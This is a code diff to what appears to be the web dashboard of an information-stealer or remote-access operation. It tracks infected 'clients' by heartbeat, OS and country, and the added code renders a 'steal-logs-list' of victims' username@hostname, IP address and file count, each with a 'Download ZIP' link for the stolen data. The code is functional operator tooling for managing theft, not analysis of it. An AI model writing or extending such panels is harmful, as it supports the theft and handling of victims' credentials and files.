@@ -947,13 +947,26 @@ C:\&gt;</div>
                 document.getElementById('info-last-active').textContent = formatDate(client.last_heartbeat);
 
                 // Extra info from logs
-                const logsRes = await fetch('/api/logs?search=' + encodeURIComponent(username) + '&limit=1');
+                const logsRes = await fetch('/api/logs?search=' + encodeURIComponent(username) + '&limit=10');
                 const logsData = await logsRes.json();
                 if (logsData.logs && logsData.logs.length > 0) {
                     const log = logsData.logs[0];
                     document.getElementById('info-os').textContent = log.os || '—';
                     document.getElementById('info-country').textContent = log.country_code || '—';
                     document.getElementById('info-first-seen').textContent = formatDate(log.created_at);
+
+                    const listEl = document.getElementById('steal-logs-list');
+                    if (listEl) {
+                        listEl.innerHTML = logsData.logs.map(l => `
+                            <div class="panel-card" style="margin-bottom:12px; display:flex; justify-content:space-between; align-items:center; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08); padding:12px 16px; border-radius:8px;">
+                                <div>
+                                    <h4 style="margin:0; font-size:14px; font-weight:600;">${escapeHtml(l.username)}@${escapeHtml(l.hostname)}</h4>
+                                    <p style="margin:4px 0 0 0; font-size:12px; color:var(--text-muted);">IP: ${escapeHtml(l.ip)} | Files: ${l.file_count} | ${formatDate(l.created_at)}</p>
+                                </div>
+                                <a href="/api/logs/${l.id}/download" class="btn btn-primary btn-sm" download style="text-decoration:none;">Download ZIP</a>
+                            </div>
+                        `).join('');
+                    }
                 }
             } catch (err) {
                 console.error('Failed to load client info:', err);
